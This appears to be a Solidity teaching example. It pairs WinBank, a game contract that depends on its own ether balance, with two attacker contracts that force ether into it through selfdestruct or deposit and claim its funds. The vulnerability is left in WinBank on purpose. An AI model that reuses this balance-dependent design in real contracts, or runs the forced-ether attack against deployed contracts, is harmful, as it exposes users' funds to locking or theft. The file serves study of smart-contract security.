// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract WinBank {
    uint public targetAmount = 5 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether at once");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game Over. Winner has been already determined.");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "You are not the winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    // @notice Get the balance of Ether held by the contract.
    // @return The balance of the contract in wei.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract SelfDestructAttack1 {
    WinBank winbank;

    constructor(WinBank _winbank) {
        winbank = WinBank(_winbank);
    }

    function attack() public payable {
        address payable bankAddress = payable(address(winbank));
        selfdestruct(bankAddress);
    }
}

contract SelfDestructAttack2 {
    address payable bankAddress;

    constructor(address payable _bankAddress) {
        bankAddress = _bankAddress;
    }

    fallback() external payable {}

    function attack() public payable {
        WinBank(bankAddress).deposit{value: msg.value}();
        WinBank(bankAddress).claimReward();

        uint attackerBalance = address(this).balance;
        payable(msg.sender).transfer(attackerBalance);
    }
}
